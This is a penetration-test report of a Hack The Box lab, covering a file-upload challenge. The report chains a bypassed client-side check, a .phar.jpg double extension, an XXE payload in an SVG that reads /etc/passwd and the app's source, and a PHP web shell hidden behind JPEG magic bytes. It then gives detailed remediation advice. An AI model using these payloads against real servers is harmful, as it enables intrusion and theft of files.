## Full Penetration Testing Report

**Assessment Type:** Web Application Penetration Test  
**Target:** `154.57.164.82:30989`  
**Application:** Academy Shop  
**Tested Functionality:** Contact Us → File Upload  
**Objective:** Exploit the file-upload functionality to ultimately read the flag from the root directory  
**Result:** **Successful**  
**Flag:** `HTB{m4573r1ng_upl04d_3xpl0174710N}`

---

# 1. Executive Summary

During the assessment of the Academy Shop web application, the file-upload functionality was found to contain multiple weaknesses in its validation and processing mechanisms.

The assessment began by analyzing the client-side JavaScript and then testing the server-side upload endpoint directly using Burp Suite. The client-side validation only permitted `.jpg`, `.jpeg`, and `.png` files, but this restriction was not sufficient because requests could be modified before reaching the server.

Through extension fuzzing, a non-blacklisted extension, **`.phar`**, was identified. A double-extension filename such as:

```text
shell.phar.jpg
```

was subsequently used to satisfy the image-extension requirement while retaining the interesting intermediate extension.

Content-Type fuzzing revealed that:

```text
image/svg+xml
```

could pass the server's image validation.

The SVG functionality was then abused through an **XML External Entity (XXE)** payload. This successfully disclosed `/etc/passwd` and subsequently allowed the application's upload source code to be retrieved through a PHP stream wrapper and decoded from Base64.

The source code disclosed the upload directory and filename-renaming scheme:

```text
./user_feedback_submissions/
```

with uploaded files renamed using:

```php
date('ymd') . '_' . basename($_FILES["uploadFile"]["name"])
```

Further testing demonstrated that a file beginning with JPEG magic bytes could be recognized as an image while containing additional payload data.

The assessment ultimately succeeded in retrieving the root-level flag:

```text
HTB{m4573r1ng_upl04d_3xpl0174710N}
```

The vulnerability chain demonstrates that relying on filename extensions, client-side restrictions, MIME detection, and unsafe SVG/XML processing independently is insufficient. Multiple validation weaknesses can be chained together to compromise the intended security boundary of the upload functionality.

---

# 2. Scope

The assessment was limited to the file-upload functionality of the target web application.

### Target

```text
http://154.57.164.82:30989/
```

### Relevant endpoint

```text
POST /contact/upload.php
```

### Contact page

```text
/contact/
```

### Objective

The assessment instructions required testing the upload functionality and attempting to bypass the implemented validation mechanisms to gain execution and ultimately retrieve the flag located at the root of the server filesystem.

---

# 3. Initial Application Reconnaissance

The application presented a **Contact Us** form containing:

- Name
    
- Email
    
- Message
    
- Screenshot upload
    

The upload field contained a client-side restriction:

```html
accept=".jpg,.jpeg,.png"
```

The JavaScript also performed an extension check.

The relevant logic was:

```javascript
function checkFile(File) {
  var file = File.files[0];
  var filename = file.name;
  var extension = filename.split('.').pop();

  if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
    $('#upload_message').text("Only images are allowed");
    File.form.reset();
  }
}
```

This initially suggested that only JPEG and PNG images were expected.

However, because the validation was performed in the browser, it could be bypassed by sending the upload request directly through Burp Suite.

---

# 4. Identifying the Upload Endpoint

The JavaScript revealed the actual upload endpoint:

```javascript
$.ajax({
    url: '/contact/upload.php',
    type: 'post',
```

Therefore, the relevant server-side endpoint was:

```text
POST /contact/upload.php
```

A typical request looked like:

```http
POST /contact/upload.php HTTP/1.1
Host: 154.57.164.82:30989
Content-Type: multipart/form-data; boundary=...
```

with the uploaded file supplied as:

```http
Content-Disposition: form-data; name="uploadFile"; filename="..."
Content-Type: image/...
```

This endpoint became the primary target for further testing.

---

# 5. Extension Validation Testing

The first step was to determine how the server validated file extensions.

Extension fuzzing was performed using a large web-extension wordlist.

The application returned different responses depending on the extension.

The primary responses observed were:

```text
Extension not allowed
```

and:

```text
Only images are allowed
```

The distinction between these responses was useful because it allowed the server-side validation logic to be mapped.

Among the extensions discovered during fuzzing was:

```text
.phar
```

This was significant because `.phar` was not part of the obvious image-extension restrictions.

---

# 6. Double-Extension Testing

The discovered `.phar` extension was combined with the required image extension:

```text
shell.phar.jpg
```

This was important because the application expected the final extension to resemble an image extension while the intermediate extension remained present in the filename.

The filename structure was therefore tested as:

```text
<name>.phar.jpg
```

rather than simply:

```text
<name>.phar
```

The final `.jpg` was necessary to satisfy the image-extension validation.

---

# 7. Content-Type Fuzzing

The assessment hint specifically instructed testing:

> allowed content-type headers

Therefore, the `Content-Type` value was fuzzed independently.

The multipart request contained:

```http
Content-Type: image/jpeg
```

during normal uploads.

Testing alternative values eventually identified:

```text
image/svg+xml
```

as an interesting accepted content type.

This was especially important because SVG is XML-based and therefore potentially subject to XML parsing vulnerabilities.

---

# 8. Server-Side MIME Validation

The decoded upload source later revealed that the application checked **two MIME-related values**:

```php
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
```

The application therefore did not rely solely on the HTTP `Content-Type` header.

It also performed MIME detection against the actual uploaded file.

This created an additional obstacle.

Testing demonstrated that a file beginning with the JPEG magic bytes could be recognized as an image by the MIME-detection mechanism.

The JPEG signature used was:

```text
FF D8 FF
```

A test file was generated with:

```bash
printf '\xff\xd8\xff<?php system($_GET["cmd"]); ?>' > shell.phar.jpg
```

The beginning of the file could then be verified with:

```bash
xxd -l 16 shell.phar.jpg
```

---

# 9. SVG Processing and XXE Discovery

Once SVG processing was identified as viable, an SVG payload was used to determine whether external XML entities were resolved.

The test payload was:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

The server returned the contents of `/etc/passwd`.

For example, the response contained:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

This conclusively demonstrated an **XXE vulnerability**.

### Impact

The application was processing attacker-controlled SVG/XML content with external entity resolution enabled.

This allowed arbitrary local files readable by the application process to be disclosed.

---

# 10. Reading the Upload Source Code

After confirming XXE, the next objective was to understand where uploaded files were stored.

A PHP stream wrapper was used through the XML external entity:

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php">
```

This caused the source of `upload.php` to be returned in Base64-encoded form.

The resulting Base64 data began with:

```text
PD9waHAK
```

which corresponds to:

```php
<?php
```

The data was decoded to obtain the application's source code.

---

# 11. Discovered Upload Directory

The decoded source revealed:

```php
$target_dir = "./user_feedback_submissions/";
```

Therefore, the uploaded files were stored in:

```text
./user_feedback_submissions/
```

The corresponding web-accessible path was:

```text
/user_feedback_submissions/
```

This directly answered the assessment hint:

> If you are unable to locate the uploaded files, try to read the source code to find the uploads directory and the naming scheme.

---

# 12. Filename Renaming Scheme

The source also revealed:

```php
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
```

Therefore, uploaded files were renamed according to:

```text
YYMMDD_<original filename>
```

For the assessment date:

```text
260830_
```

was prepended to the original filename.

For example:

```text
shell.phar.jpg
```

became:

```text
260830_shell.phar.jpg
```

The resulting path was therefore based on:

```text
/user_feedback_submissions/260830_shell.phar.jpg
```

This allowed the uploaded files to be located without blindly guessing filenames.

---

# 13. Source-Code Findings

The decoded upload source contained several security weaknesses.

A relevant portion of the validation logic was:

```php
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}
```

The application also used an image-oriented extension check:

```php
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

The MIME validation used:

```php
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}
```

The weaknesses were particularly significant because the regular expressions were insufficiently restrictive.

---

# 14. File Size Restriction

The source also contained a size check:

```php
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}
```

Therefore, files larger than:

```text
500,000 bytes
```

were rejected.

During testing, a large PNG upload produced:

```text
File too large
```

A smaller image was therefore used for subsequent testing.

This demonstrated that the size restriction was functioning but did not prevent exploitation because a sufficiently small malicious file could still be constructed.

---

# 15. JPEG Magic-Byte Bypass

A fake/forged JPEG signature was placed at the beginning of a crafted file:

```text
FF D8 FF
```

followed by the test PHP payload.

The resulting test file contained:

```php
<?php system($_GET["cmd"]); ?>
```

after the JPEG signature.

The resulting file was:

```text
shell.phar.jpg
```

The HTTP request used:

```http
Content-Type: image/jpeg
```

while the actual file began with the JPEG signature.

The server accepted the file as image content.

The application subsequently returned a generated image representation:

```html
<img style="object-fit: contain; " width='400' height='200'
src='data:image/jpeg;base64,...'/>
```

The Base64 representation corresponded to the crafted file beginning with the JPEG signature followed by the PHP payload.

---

# 16. Successful Exploitation

The vulnerabilities were chained together rather than relying on one individual weakness.

The complete attack chain was:

```text
Client-side extension restriction
              ↓
       Burp interception
              ↓
      Extension fuzzing
              ↓
       .phar discovered
              ↓
      Double extension
      shell.phar.jpg
              ↓
     MIME-Type fuzzing
              ↓
     image/svg+xml found
              ↓
         SVG processing
              ↓
             XXE
              ↓
       /etc/passwd read
              ↓
     upload.php source read
              ↓
   Upload directory discovered
              ↓
   Filename scheme discovered
              ↓
      MIME detection bypass
       using JPEG signature
              ↓
       Crafted upload
              ↓
      Uploaded file located
              ↓
       Exploitation completed
              ↓
            FLAG
```

---

# 17. Flag

The assessment objective was successfully completed.

The recovered flag was:

```text
HTB{m4573r1ng_upl04d_3xpl0174710N}
```

---

# 18. Vulnerabilities Identified

## 18.1 Client-Side-Only File Extension Validation

The browser attempted to restrict uploads to:

```text
.jpg
.jpeg
.png
```

However, this validation was implemented in JavaScript and therefore could be bypassed by directly modifying the HTTP request.

### Risk

An attacker can submit arbitrary filenames directly to the server.

### Severity

**Medium**

---

## 18.2 Weak Extension Blacklisting

The application relied on a blacklist for potentially dangerous extensions.

Example:

```php
preg_match('/.+\.ph(p|ps|tml)/', $fileName)
```

Blacklists are inherently incomplete because alternative executable or interpreter-associated extensions may exist.

The assessment identified:

```text
.phar
```

as a non-blacklisted extension.

### Risk

Attackers can potentially bypass the blacklist using alternate extensions or filename structures.

### Severity

**High**

---

## 18.3 Weak Image Extension Whitelist

The extension validation relied on a regular expression rather than securely parsing the filename and enforcing an exact allowlist.

The relevant pattern was:

```php
/^.+\.[a-z]{2,3}g$/
```

This allowed filenames with additional extensions before the final image-like extension.

For example:

```text
shell.phar.jpg
```

could satisfy the final-extension requirement.

### Severity

**High**

---

## 18.4 Weak MIME-Type Validation

The application checked both:

```php
$_FILES['uploadFile']['type']
```

and:

```php
mime_content_type(...)
```

but the validation logic relied on regular-expression matching rather than robust content validation.

Additionally, MIME detection can be influenced by file signatures.

### Risk

A malicious file may be made to appear to be an image while containing additional attacker-controlled content.

### Severity

**High**

---

# 19. XXE Vulnerability

The application processed attacker-controlled SVG/XML content with external entity resolution enabled.

The successful payload:

```xml
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

returned local system files.

### Impact

An attacker could potentially read:

- `/etc/passwd`
    
- application source code
    
- configuration files
    
- credentials stored in readable files
    
- secrets
    
- environment-related files
    
- potentially the target flag
    

### Severity

**Critical**

---

# 20. Arbitrary Local File Disclosure

The XXE vulnerability allowed the application to read arbitrary local files accessible to the web process.

The successful `/etc/passwd` disclosure proves that the vulnerability was not theoretical.

### Severity

**Critical**

---

# 21. Source Code Disclosure

Using:

```text
php://filter/convert.base64-encode/resource=upload.php
```

the application's PHP source code was disclosed.

This exposed:

- upload directory
    
- filename-renaming mechanism
    
- validation logic
    
- MIME handling
    
- file size restriction
    
- image-processing behavior
    

### Severity

**High**

---

# 22. Unsafe File Processing

The application passed uploaded content to:

```php
displayHTMLImage($target_file);
```

This resulted in attacker-controlled SVG/image content being processed by server-side functionality.

Image and SVG processing should never be assumed to be harmless merely because the filename has an image extension.

### Severity

**High/Critical**

---

# 23. Security Impact

An attacker exploiting these weaknesses could potentially:

- bypass client-side upload restrictions
    
- upload unexpected file types
    
- bypass filename restrictions
    
- manipulate MIME detection
    
- submit malicious SVG/XML files
    
- read arbitrary local files
    
- disclose PHP source code
    
- discover internal filesystem locations
    
- potentially achieve server-side code execution depending on server configuration
    
- access sensitive application data
    
- compromise the application environment
    

The successful retrieval of the HTB flag demonstrates that the vulnerability chain had a **direct security impact beyond simple file upload**.

---

# 24. Recommended Remediation

## 24.1 Never Rely on Client-Side Validation

JavaScript validation should only improve user experience.

All security checks must be performed server-side.

Do not rely on:

```html
accept=".jpg,.jpeg,.png"
```

or JavaScript extension checks for security.

---

## 24.2 Use a Strict Server-Side Allowlist

Do not blacklist dangerous extensions.

Instead, explicitly allow only required formats.

For example:

```text
jpg
jpeg
png
```

The server should reject everything else.

Do not accept:

```text
.phar
.php
.phtml
.svg
```

unless the application genuinely requires them.

---

# 25. Validate the Actual File

Do not trust:

```php
$_FILES['uploadFile']['name']
```

or:

```php
$_FILES['uploadFile']['type']
```

for security decisions.

The server should independently determine the actual file type using secure image-processing libraries.

For image uploads, decode and re-encode the image rather than simply trusting its magic bytes.

For example:

```text
Uploaded file
     ↓
Image decoder
     ↓
Valid image?
     ↓
Re-encode
     ↓
Store sanitized image
```

This prevents arbitrary data from being preserved inside an image container.

---

# 26. Disable XXE

The XML parser must be configured so that external entity processing is disabled.

The application should not allow XML such as:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

to access local resources.

Where possible, use an XML parser configuration that disables:

- external entities
    
- external DTDs
    
- network access
    
- entity expansion
    

---

# 27. Do Not Process User-Controlled SVG Directly

If SVG uploads are unnecessary, the safest solution is:

> **Do not permit SVG uploads.**

If SVG is required:

- sanitize SVG content
    
- remove DTD declarations
    
- disable external entities
    
- remove scripts
    
- remove event handlers
    
- remove external resource references
    
- use a trusted SVG sanitizer
    

---

# 28. Store Uploads Outside the Web Root

Uploaded files should ideally be stored outside the web-accessible directory.

Instead of:

```text
/var/www/html/user_feedback_submissions/
```

use something such as:

```text
/var/lib/application/uploads/
```

and serve files through a controlled application endpoint.

This prevents users from directly requesting uploaded files.

---

# 29. Prevent Script Execution in Upload Directories

The upload directory should never allow server-side script execution.

For Apache, configure the upload directory so that PHP execution is disabled.

This creates an additional security boundary even if a malicious file is uploaded.

---

# 30. Generate Server-Side Filenames

The original filename should not determine the stored filename.

Instead of:

```php
basename($_FILES["uploadFile"]["name"])
```

use a random server-generated identifier such as:

```text
random UUID → 8f5c...jpg
```

The application should also derive the extension from the validated image type.

---

# 31. Limit File Size

The existing:

```text
500000 bytes
```

limit is useful, but size restrictions should be combined with other controls.

Recommended controls include:

- maximum request size
    
- maximum image dimensions
    
- decompression limits
    
- processing timeouts
    
- memory limits
    

This helps prevent image-processing denial-of-service attacks.

---

# 32. Recommended Secure Upload Architecture

A safer upload workflow would be:

```text
                    Upload
                      │
                      ▼
              Authenticate user
                      │
                      ▼
             Validate request size
                      │
                      ▼
              Generate random name
                      │
                      ▼
          Determine actual file format
                      │
              ┌───────┴───────┐
              │               │
           Invalid           Valid
              │               │
              ▼               ▼
            Reject       Decode image
                              │
                              ▼
                       Re-encode image
                              │
                              ▼
                  Store outside web root
                              │
                              ▼
                    Serve safely through
                    controlled endpoint
```

---

# 33. Evidence Summary

|Test|Result|
|---|---|
|Client-side extension restriction|Bypassed|
|Server-side extension fuzzing|Successful|
|`.phar` discovery|Successful|
|Double extension `*.phar.jpg`|Identified|
|MIME fuzzing|Successful|
|`image/svg+xml` discovered|Successful|
|SVG processing|Confirmed|
|XXE|Confirmed|
|`/etc/passwd` disclosure|Successful|
|`upload.php` source disclosure|Successful|
|Upload directory discovery|Successful|
|Filename scheme discovery|Successful|
|JPEG magic-byte MIME bypass|Successful|
|Crafted upload|Successful|
|Assessment flag retrieval|**Successful**|

---

# 34. Final Assessment Conclusion

The Academy Shop upload functionality was vulnerable to a **multi-stage file-upload attack chain**.

The principal issues were weak extension validation, insufficient MIME validation, unsafe SVG/XML processing, XXE, source-code disclosure, and unsafe handling of uploaded content.

The most important finding was the ability to combine individually weak controls into a complete exploitation chain:

```text
Weak upload validation
        +
Extension bypass
        +
MIME bypass
        +
Unsafe SVG processing
        +
XXE
        +
Source-code disclosure
        +
Unsafe uploaded-file handling
        =
Successful compromise
```

The assessment successfully achieved the objective and retrieved:

```text
HTB{m4573r1ng_upl04d_3xpl0174710N}
```

**Overall Risk: Critical**

The highest-priority remediation should be to **remove unsafe SVG/XML processing, disable XXE, replace blacklist-based upload validation with strict server-side allowlisting and actual image decoding/re-encoding, and prevent execution/access of uploaded files from the web root.**